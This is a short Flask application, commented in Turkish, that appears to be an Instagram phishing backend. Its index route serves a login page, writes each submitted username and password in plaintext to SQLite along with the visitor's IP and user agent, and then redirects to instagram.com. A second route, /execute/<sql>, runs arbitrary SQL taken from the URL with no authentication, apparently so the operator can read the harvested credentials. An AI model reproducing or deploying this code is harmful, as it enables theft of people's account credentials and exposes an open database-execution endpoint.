from flask import Flask, request, render_template, redirect, g
import sqlite3

app = Flask(__name__)

# Veritabanı konfigürasyonu
DATABASE = 'database.db'
app.config['DATABASE'] = DATABASE

# SQLite veritabanı bağlantısını açma fonksiyonu
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

# Veritabanı bağlantısını kapama fonksiyonu
@app.teardown_appcontext
def close_db(error):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        host = request.remote_addr
        user = request.remote_user
        user_agent = request.user_agent.string

        cursor = get_db().cursor()
        cursor.execute('INSERT INTO user (username, password, host, user, user_agent) VALUES (?, ?, ?, ?, ?)',
                       (username, password, host, user, user_agent))
        get_db().commit()
        return redirect('http://instagram.com')

    return render_template('login.html')

@app.route("/execute/<sql>")
def execute(sql):
    info = None
    try:
        cursor = get_db().cursor()
        cursor.execute(sql)
        info = cursor.fetchall()
    except Exception as e:
        info = ("Error executing SQL command: {}".format(str(e)),)

    return render_template('execute.html', info=info)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=80)
